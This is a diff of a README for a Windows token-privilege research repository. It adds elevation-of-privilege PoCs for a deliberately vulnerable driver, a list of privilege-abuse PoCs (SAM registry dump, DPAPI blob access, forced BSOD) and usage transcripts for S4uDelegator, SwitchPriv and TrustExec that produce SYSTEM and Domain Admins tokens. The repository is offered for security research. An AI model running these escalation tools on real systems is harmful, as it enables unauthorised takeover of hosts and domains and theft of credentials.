@@ -19,15 +19,10 @@ Codes in this repository are intended to help investigate how token privileges w
     - [enableall Command](#enableall-command)
     - [disableall Command](#disableall-command)
   - [PrivilegedOperations](#privilegedoperations)
+  - [S4uDelegator](#s4udelegator)
   - [SwitchPriv](#switchpriv)
   - [TrustExec](#trustexec)
-    - [exec Module](#exec-module)
-    - [sid Module](#sid-module)
   - [UserRightsUtil](#userrightsutil)
-    - [enum Module](#enum-module)
-    - [find Module](#find-module)
-    - [lookup Module](#lookup-module)
-    - [manage Module](#manage-module)
   - [Reference](#reference)
   - [Acknowledgments](#acknowledgments)
 
@@ -39,7 +34,7 @@ Codes in this repository are intended to help investigate how token privileges w
 
 The purpose of this project is to investigate how attackers abuse arbitrary kernel write vulnerability.
 All PoCs are written for [HackSys Extreme Vulnerable Driver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver).
-These PoCs perform to get SYSTEM integrity level by abusing arbitrary kernel write vulnerability and token privileges.
+Most of these PoCs perform to get SYSTEM integrity level by abusing arbitrary kernel write vulnerability and token privileges.
 Tested on Windows 10 version 1809/1903, but they should work most of Windows 10 theoretically:
 
 | PoC Name | Description |
@@ -49,7 +44,11 @@ Tested on Windows 10 version 1809/1903, but they should work most of Windows 10 
 | [CreateTokenVariant](./KernelWritePoCs/CreateTokenVariant/CreateTokenVariant.cs) | This PoC performs EoP with `SeCreateTokenPrivilege`. |
 | [DebugInjectionVariant](./KernelWritePoCs/DebugInjectionVariant/DebugInjectionVariant.cs) | This PoC performs EoP with `SeDebugPrivilege`. Uses code injection to winlogon.exe at final stage. |
 | [DebugUpdateProcVariant](./KernelWritePoCs/DebugUpdateProcVariant/DebugUpdateProcVariant.cs) | This PoC performs EoP with `SeDebugPrivilege`. Creates SYSTEM process from winlogon.exe with `UpdateProcThreadAttribute` API at final stage. |
+| [RestoreServiceModificationVariant](./KernelWritePoCs/RestoreServiceModificationVariant/RestoreServiceModificationVariant.cs) | This PoC performs EoP with `SeRestorePrivilege`. Use [HijackShellLib](./KernelWritePoCs/HijackShellLib) with this PoC. |
 | [SecondaryLogonVariant](./KernelWritePoCs/SecondaryLogonVariant/SecondaryLogonVariant.cs) | This PoC performs EoP with `SeCreateTokenPrivilege` and `SeImpersonatePrivilege`. Uses secondary logon service at final stage. |
+| [TakeOwnershipServiceModificationVariant](./KernelWritePoCs/TakeOwnershipServiceModificationVariant/TakeOwnershipServiceModificationVariant.cs) | This PoC performs EoP with `SeTakeOwnershipPrivilege`. Use [HijackShellLib](./KernelWritePoCs/HijackShellLib) with this PoC. |
+| [TcbS4uAssignTokenVariant](./KernelWritePoCs/TcbS4uAssignTokenVariant/TcbS4uAssignTokenVariant.cs) | This PoC performs EoP with `SeTcbPrivilege`. Get System mandatory level shell from medium mandatory level. |
+| [TcbS4uImpersonationVariant](./KernelWritePoCs/TcbS4uImpersonationVariant/TcbS4uImpersonationVariant.cs) | This PoC performs EoP with `SeTcbPrivilege`. Performs thread impersonation with S4U logon. Not get high or system integrity level. |
 
 
 ## PrivEditor
@@ -631,14 +630,202 @@ SeIncreaseWorkingSetPrivilege              Disabled
 
 [Project](./PrivilegedOperations)
 
-This project is PoCs for sensitive token privileges such SeDebugPrivilege.
+This project is PoCs for sensitive token privileges such `SeDebugPrivilege`.
 Currently, released PoCs for a part of them.
 
 | Program Name | Description |
 | :--- | :--- |
-| [SeCreateTokenPrivilegePoC](./PrivilegedOperations/SeCreateTokenPrivilegePoC) | This PoC creates a elevated token by SeCreateTokenPrivilege. |
-| [SeRestorePrivilegePoC](./PrivilegedOperations/SeRestorePrivilegePoC) | This PoC opens a handle to privileged registry key (`HKLM:\SYSTEM\CurrentControlSet\Services\dmwappushservice\Parameters`) with `REG_OPTION_BACKUP_RESTORE` flag by SeRestorePrivilege. |
-| [SeDebugPrivilegePoC](./PrivilegedOperations/SeDebugPrivilegePoC) | This PoC opens a handle to winlogon.exe by SeDebugPrivilege. |
+| [SeAuditPrivilegePoC](./PrivilegedOperations/SeAuditPrivilegePoC) | This PoC tries to create new security event(s) by `SeAuditPrivilegePoC`. `SeAuditPrivilege` does not require high integrity level, but this PoC requires administrative privileges at the first execution to install new event source. Additionally, to confirm the result, this PoC may require modification of local security policy setting. |
+| [SeBackupPrivilegePoC](./PrivilegedOperations/SeBackupPrivilegePoC) | This PoC tries to dump `HKLM\SAM` by `SeBackupPrivilege`. |
+| [SeCreatePagefilePrivilegePoC](./PrivilegedOperations/SeCreatePagefilePrivilegePoC) | This PoC tries to set pagefile option to specific values by `SeCreatePagefilePrivilege`. |
+| [SeCreateTokenPrivilegePoC](./PrivilegedOperations/SeCreateTokenPrivilegePoC) | This PoC tries to create a elevated token by `SeCreateTokenPrivilege`. |
+| [SeDebugPrivilegePoC](./PrivilegedOperations/SeDebugPrivilegePoC) | This PoC tries to open a handle to winlogon.exe by `SeDebugPrivilege`. |
+| [SeRestorePrivilegePoC](./PrivilegedOperations/SeRestorePrivilegePoC) | This PoC tries to write test file in `C:\Windows\System32\` by `SeRestorePrivilege`. |
+| [SeSecurityPrivilegePoC](./PrivilegedOperations/SeSecurityPrivilegePoC) | This PoC tries to read the latest security event by `SeSecurityPrivilege`. |
+| [SeShutdownPrivilegePoC](./PrivilegedOperations/SeShutdownPrivilegePoC) | This PoC tries to cause BSOD by `SeShutdownPrivilege`. |
+| [SeSystemEnvironmentPrivilegePoC](./PrivilegedOperations/SeSystemEnvironmentPrivilegePoC) | This PoC tries to enumerate system environment by `SeSystemEnvironmentPrivilege`. Works for UEFI based system only. |
+| [SeTakeOwnershipPrivilegePoC](./PrivilegedOperations/SeTakeOwnershipPrivilegePoC) | This PoC tries to change the owner of `HKLM:\SYSTEM\CurrentControlSet\Services\dmwappushservice` to the caller user account by `SeTakeOwnershipPrivilege`. |
+| [SeTcbPrivilegePoC](./PrivilegedOperations/SeTcbPrivilegePoC) | This PoC tries to perform S4U Logon to be `Builtin\Backup Operators` by `SeTcbPrivilege`. |
+| [SeTrustedCredManAccessPrivilegePoC](./PrivilegedOperations/SeTrustedCredManAccessPrivilegePoC) | This PoC tries to access DPAPI blob by `SeTrustedCredManAccessPrivilege`. |
+
+## S4uDelegator
+
+[Back to Top](#privfu)
+
+[Project](./S4uDelegator)
+
+This tool is to perform S4U logon with SeTcbPrivilege.
+To perform S4U logon with this tool, administrative privileges are required.
+Currently, a few operations are implemented (more operations will be implemented in future):
+
+```
+C:\dev>S4uDelegator.exe -h
+
+S4uDelegator - Tool for S4U Logon.
+
+Usage: S4uDelegator.exe [Options]
+
+        -h, --help   : Displays this help message.
+        -m, --module : Specifies module name.
+
+Available Modules:
+
+        + lookup - Lookup account's SID.
+        + shell  - Perform S4U logon and get shell.
+
+[*] To see help for each modules, specify "-m <Module> -h" as arguments.
+
+[!] -m option is required.
+```
+
+
+### lookup Module
+
+This command is to lookup account SID as follows:
+
+```
+C:\dev>S4uDelegator.exe -m lookup -d contoso -u david
+
+[*] Result:
+    |-> Account Name : CONTOSO\david
+    |-> SID          : S-1-5-21-3654360273-254804765-2004310818-1104
+    |-> Account Type : SidTypeUser
+
+
+C:\dev>S4uDelegator.exe -m lookup -s S-1-5-21-3654360273-254804765-2004310818-500
+
+[*] Result:
+    |-> Account Name : CONTOSO\Administrator
+    |-> SID          : S-1-5-21-3654360273-254804765-2004310818-500
+    |-> Account Type : SidTypeUser
+
+
+C:\dev>S4uDelegator.exe -m lookup -d contoso -u "domain admins"
+
+[*] Result:
+    |-> Account Name : CONTOSO\Domain Admins
+    |-> SID          : S-1-5-21-3654360273-254804765-2004310818-512
+    |-> Account Type : SidTypeGroup
+```
+
+If you don't specify domain name with `-d` option, use local computer name as domain name:
+
+```
+C:\dev>hostname
+CL01
+
+C:\dev>S4uDelegator.exe -m lookup -u admin
+
+[*] Result:
+    |-> Account Name : CL01\admin
+    |-> SID          : S-1-5-21-2659926013-4203293582-4033841475-500
+    |-> Account Type : SidTypeUser
+```
+
+
+### shell Module
+
+This command is to get interactive shell with S4U logon:
+
+```
+C:\dev>whoami /user
+
+USER INFORMATION
+----------------
+
+User Name     SID
+============= =============================================
+contoso\david S-1-5-21-3654360273-254804765-2004310818-1104
+
+C:\dev>S4uDelegator.exe -m shell -u admin
+
+[>] Target account to S4U:
+    |-> Account Name        : CL01\admin
+    |-> Account Sid         : S-1-5-21-2659926013-4203293582-4033841475-500
+    |-> Account Type        : SidTypeUser
+    |-> User Principal Name : (NULL)
+[>] Trying to get SYSTEM.
+[+] SeDebugPrivilege is enabled successfully.
+[>] Trying to impersonate as smss.exe.
+[+] SeAssignPrimaryTokenPrivilege is enabled successfully.
+[>] Trying to impersonate thread token.
+    |-> Current Thread ID : 7140
+[+] Impersonation is successful.
+[>] Trying to MSV S4U logon.
+[+] S4U logon is successful.
+[>] Trying to create a token assigned process.
+
+Microsoft Windows [Version 10.0.18362.175]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\dev>whoami /user
+
+USER INFORMATION
+----------------
+
+User Name  SID
+========== =============================================
+cl01\admin S-1-5-21-2659926013-4203293582-4033841475-500
+```
+
+If you want to add token groups, you can specify them comma separated SID values with `-e` option as follows:
+
+```
+C:\Tools>whoami
+contoso\david
+
+C:\Tools>S4uDelegator.exe -m shell -d contoso -u administrator -e s-1-5-18,S-1-5-19
+
+[>] Target account to S4U:
+    |-> Account Name        : CONTOSO\administrator
+    |-> Account Sid         : S-1-5-21-3654360273-254804765-2004310818-500
+    |-> Account Type        : SidTypeUser
+    |-> User Principal Name : administrator@contoso.local
+[>] Group SID to add:
+    |-> [VALID] NT AUTHORITY\SYSTEM (SID : S-1-5-18) will be added.
+    |-> [VALID] NT AUTHORITY\LOCAL SERVICE (SID : S-1-5-19) will be added.
+[>] Trying to get SYSTEM.
+[+] SeDebugPrivilege is enabled successfully.
+[>] Trying to impersonate as smss.exe.
+[+] SeAssignPrimaryTokenPrivilege is enabled successfully.
+[+] SeIncreaseQuotaPrivilege is enabled successfully.
+[>] Trying to impersonate thread token.
+    |-> Current Thread ID : 2660
+[+] Impersonation is successful.
+[>] Trying to Kerberos S4U logon.
+[+] S4U logon is successful.
+[>] Trying to create a token assigned process.
+
+Microsoft Windows [Version 10.0.18362.175]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Tools>whoami
+contoso\administrator
+
+C:\Tools>whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                     Type             SID                                          Attributes
+============================================== ================ ============================================ ===============================================================
+Everyone                                       Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                                  Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                         Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
+NT AUTHORITY\NETWORK                           Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users               Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization                 Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SYSTEM                            Well-known group S-1-5-18                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\LOCAL SERVICE                     Well-known group S-1-5-19                                     Mandatory group, Enabled by default, Enabled group
+CONTOSO\Group Policy Creator Owners            Group            S-1-5-21-3654360273-254804765-2004310818-520 Mandatory group, Enabled by default, Enabled group
+CONTOSO\Domain Admins                          Group            S-1-5-21-3654360273-254804765-2004310818-512 Mandatory group, Enabled by default, Enabled group
+CONTOSO\Schema Admins                          Group            S-1-5-21-3654360273-254804765-2004310818-518 Mandatory group, Enabled by default, Enabled group
+CONTOSO\Enterprise Admins                      Group            S-1-5-21-3654360273-254804765-2004310818-519 Mandatory group, Enabled by default, Enabled group
+Service asserted identity                      Well-known group S-1-18-2                                     Mandatory group, Enabled by default, Enabled group
+CONTOSO\Denied RODC Password Replication Group Alias            S-1-5-21-3654360273-254804765-2004310818-572 Mandatory group, Enabled by default, Enabled group, Local Group
+Mandatory Label\System Mandatory Level         Label            S-1-16-16384
+```
+
 
 
 ## SwitchPriv
@@ -935,6 +1122,68 @@ SeUndockPrivilege             Remove computer from docking station Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
 ```
 
+To find process have a specific privilege, use `--find` option as follows:
+
+```
+C:\dev>SwitchPriv.exe -f createtoken
+
+[>] Searching process have SeCreateTokenPrivilege.
+[+] Following Processes have SeCreateTokenPrivilege.
+    |-> smss (PID : 340)
+    |-> csrss (PID : 532)
+    |-> lsass (PID : 700)
+    |-> csrss (PID : 464)
+    |-> Memory Compression (PID : 1828)
+[+] 5 process have SeCreateTokenPrivilege.
+[*] Access is denied by following 2 process.
+    |-> System (PID : 4)
+    |-> Idle (PID : 0)
+
+
+C:\dev>SwitchPriv.exe -g -p 464
+
+[>] Trying to get available token privilege(s) for the target process.
+    |-> Target PID   : 464
+    |-> Process Name : csrss
+
+Privilege Name                             State
+========================================== ========
+SeCreateTokenPrivilege                     Disabled
+SeAssignPrimaryTokenPrivilege              Disabled
+SeLockMemoryPrivilege                      Enabled
+SeIncreaseQuotaPrivilege                   Disabled
+SeTcbPrivilege                             Enabled
+SeSecurityPrivilege                        Disabled
+SeTakeOwnershipPrivilege                   Disabled
+SeLoadDriverPrivilege                      Disabled
+SeSystemProfilePrivilege                   Enabled
+SeSystemtimePrivilege                      Disabled
+SeProfileSingleProcessPrivilege            Enabled
+SeIncreaseBasePriorityPrivilege            Enabled
+SeCreatePagefilePrivilege                  Enabled
+SeCreatePermanentPrivilege                 Enabled
+SeBackupPrivilege                          Disabled
+SeRestorePrivilege                         Disabled
+SeShutdownPrivilege                        Disabled
+SeDebugPrivilege                           Enabled
+SeAuditPrivilege                           Enabled
+SeSystemEnvironmentPrivilege               Disabled
+SeChangeNotifyPrivilege                    Enabled
+SeUndockPrivilege                          Disabled
+SeManageVolumePrivilege                    Disabled
+SeImpersonatePrivilege                     Enabled
+SeCreateGlobalPrivilege                    Enabled
+SeRelabelPrivilege                         Disabled
+SeIncreaseWorkingSetPrivilege              Enabled
+SeTimeZonePrivilege                        Enabled
+SeCreateSymbolicLinkPrivilege              Enabled
+SeDelegateSessionUserImpersonatePrivilege  Enabled
+
+[*] Integrity Level : SYSTEM_MANDATORY_LEVEL
+```
+
+
+
 If you want to set integrity level, use `--integrity` option as follows:
 
 ```
@@ -961,7 +1210,7 @@ Mandatory Label\Low Mandatory Level                           Label            S
 
 [Project](./TrustExec)
 
-This tool is to execute process as TrustedInstaller group account.
+This tool is to execute process as `NT SERVICE\TrustedInstaller` group account.
 Original PoC is [Grzegorz Tworek](https://twitter.com/0gtweet)'s [TrustedInstallerCmd2.c](https://github.com/gtworek/PSBits/blob/master/VirtualAccounts/TrustedInstallerCmd2.c).
 I ported it to C# and rebuilt it as a tool.
 Most of operations require administrative privilege (`SeDebugPrivilege`, `SeImpersonatePrivilege` and High Mandatory Level):
@@ -1002,6 +1251,7 @@ Usage: TrustExec.exe -m exec [Options]
         -d, --domain    : Specifies domain name to add. Default value is "DefaultDomain".
         -u, --username  : Specifies username to add. Default value is "DefaultUser".
         -i, --id        : Specifies RID for virtual domain. Default value is "110".
+        -e, --extra     : Specifies extra group SID(s) to add.
 
 Available Technique IDs:
 
@@ -1055,6 +1305,88 @@ SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
 SeTcbPrivilege                Act as part of the operating system       Enabled
 SeDebugPrivilege              Debug programs                            Enabled
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+```
+
+If you want to add extra group account to token for new process, use `-e` option as follows:
+
+```
+C:\dev>TrustExec.exe -m exec -s -e S-1-5-20
+
+[>] Parsing group SID(s).
+[+] "NT AUTHORITY\NETWORK SERVICE" is added as an extra group.
+    |-> SID  : S-1-5-20
+    |-> Type : SidTypeWellKnownGroup
+[>] Trying to get SYSTEM.
+[>] Trying to impersonate as smss.exe.
+[+] SeCreateTokenPrivilege is enabled successfully.
+[+] SeAssignPrimaryTokenPrivilege is enabled successfully.
+[>] Trying to impersonate thread token.
+    |-> Current Thread ID : 4392
+[+] Impersonation is successful.
+[>] Trying to create an elevated primary token.
+[+] An elevated primary token is created successfully.
+[>] Trying to create a token assigned process.
+
+Microsoft Windows [Version 10.0.22000.318]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\dev>whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID                                                            Attributes
+====================================== ================ ============================================================== ==================================================
+BUILTIN\Administrators                 Alias            S-1-5-32-544                                                   Enabled by default, Enabled group, Group owner
+Everyone                               Well-known group S-1-1-0                                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                       Mandatory group, Enabled by default, Enabled group
+Mandatory Label\System Mandatory Level Label            S-1-16-16384
+
+NT SERVICE\TrustedInstaller            Well-known group S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464 Enabled by default, Enabled group, Group owner
+NT AUTHORITY\NETWORK SERVICE           Well-known group S-1-5-20                                                       Mandatory group, Enabled by default, Enabled group
+```
+
+To add multiple groups, specifies SIDs as comma separated value:
+
+```
+C:\dev>TrustExec.exe -m exec -s -e S-1-5-20,S-1-5-32-551
+
+[>] Parsing group SID(s).
+[+] "NT AUTHORITY\NETWORK SERVICE" is added as an extra group.
+    |-> SID  : S-1-5-20
+    |-> Type : SidTypeWellKnownGroup
+[+] "BUILTIN\Backup Operators" is added as an extra group.
+    |-> SID  : S-1-5-32-551
+    |-> Type : SidTypeAlias
+[>] Trying to get SYSTEM.
+[>] Trying to impersonate as smss.exe.
+[+] SeCreateTokenPrivilege is enabled successfully.
+[+] SeAssignPrimaryTokenPrivilege is enabled successfully.
+[>] Trying to impersonate thread token.
+    |-> Current Thread ID : 3104
+[+] Impersonation is successful.
+[>] Trying to create an elevated primary token.
+[+] An elevated primary token is created successfully.
+[>] Trying to create a token assigned process.
+
+Microsoft Windows [Version 10.0.22000.318]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\dev>whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID                                                            Attributes
+====================================== ================ ============================================================== ==================================================
+BUILTIN\Administrators                 Alias            S-1-5-32-544                                                   Enabled by default, Enabled group, Group owner
+Everyone                               Well-known group S-1-1-0                                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                       Mandatory group, Enabled by default, Enabled group
+Mandatory Label\System Mandatory Level Label            S-1-16-16384
+
+NT SERVICE\TrustedInstaller            Well-known group S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464 Enabled by default, Enabled group, Group owner
+NT AUTHORITY\NETWORK SERVICE           Well-known group S-1-5-20                                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Backup Operators               Alias            S-1-5-32-551                                                   Mandatory group, Enabled by default, Enabled group
 ```
 
 If you set `1` for `-t` option, `TrustExec` will try to create `TrustedInstaller` process with virtual account technique.
